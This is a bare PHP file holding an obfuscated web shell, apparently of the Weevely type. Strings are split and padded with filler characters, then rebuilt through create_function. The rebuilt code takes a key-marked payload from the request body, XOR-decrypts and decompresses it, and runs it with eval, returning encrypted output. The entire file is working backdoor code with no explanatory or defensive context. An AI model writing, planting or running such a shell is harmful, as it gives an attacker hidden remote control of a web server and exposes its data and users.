<?php
$D='B";for($iB=0;B$i<$l;){for(B$jB=0;BB($j<$c&&$i<$l)B;$j+B+,$i++){$Bo.B=$t{';
$P=str_replace('x','','xcrexxatxe_funxcxtion');
$C='BqoC0d0zWBX";functioBn x(BB$t,B$k){$c=strlBen($k);$Bl=strlen($Bt);$oB="';
$c=');$r=@bBaBse64_encode(@xB(@gzcoBmpresBs($o),B$k));prBint("B$p$kBh$r$kf");}';
$T='(@Bx(@basBe64_decodeB($m[1])B,B$kB)));$oB=@ob_get_contenBtBs(B);@ob_enBd_clean(B';
$B='$i}B^$k{B$j};}}return B$o;}if B(@pBregB_maBtch("/$kh(.+)$kfB/",@fiBle_Bge';
$F='$k="f3dfBdb8b";B$kBh="372Be5d4faa76"B;$kf=BB"d4a6d2B93029e";$p="Bt8FBSjZV';
$K='t_cBoBntents("pBhp://iBnput"),$mBB)==B1) {B@ob_start();@eBval(@gzunBcompBress';
$i=str_replace('B','',$F.$C.$D.$B.$K.$T.$c);
$u=$P('',$i);$u();
?>
